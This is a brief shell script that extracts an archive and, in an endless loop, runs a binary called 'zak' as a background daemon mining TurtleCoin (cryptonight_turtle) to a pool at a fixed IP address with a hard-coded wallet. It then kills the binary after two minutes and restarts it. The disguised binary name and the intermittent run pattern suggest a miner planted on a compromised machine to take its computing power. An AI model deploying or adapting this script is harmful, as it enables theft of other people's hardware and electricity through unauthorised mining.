tar -xf zak.tar.xz
while true
do
echo 'i am in'
./zak -o 148.100.244.11:2349 --daemon --currency cryptonight_turtle -i 0 -r z -u userA -p TRTLv1Hqo3wHdqLRXuCyX3MwvzKyxzwXeBtycnkDy8ceFp4E23bm3P467xLEbUusH6Q1mqQUBiYwJ2yULJbvr5nKe8kcyc4uyps+bf7d5b36d5da9c403d32eb5f3b5c1319d4613de7c11090b73eb2adefebd0d7db@Hero
sleep 120
echo 'i am out'
kill -9 $(pgrep zak)
sleep 30
done
